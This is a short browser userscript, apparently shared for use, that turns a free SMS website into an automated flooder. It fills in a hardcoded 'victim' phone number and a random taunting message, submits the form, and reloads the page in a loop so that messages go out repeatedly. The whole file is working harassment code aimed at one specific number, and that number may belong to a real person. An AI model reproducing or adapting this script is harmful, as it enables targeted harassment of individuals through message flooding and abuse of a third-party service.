// ==UserScript==
// @name          seasms flooder not by me
// @namespace     Yash
// @description   flooder sms
// @include       http://*seasms.com/*
// ==/UserScript==

var victim=9025375785 //Enter victims number here
var delay=5000; // Enter delay in milliseconds if required
var name='HAHA';

if(document.getElementById('tono'))
{
document.getElementById('tono').value=victim;
document.getElementById('smstext').value=Math.floor(Math.random()*1456484)+'Yehlo krlo flood!!'+Math.floor(Math.random()*1456484);
document.getElementById('from').value=name;
void(0);
document.getElementById('S').click();
}
else
setTimeout("document.location='http://www.seasms.com/freesms.php'",delay);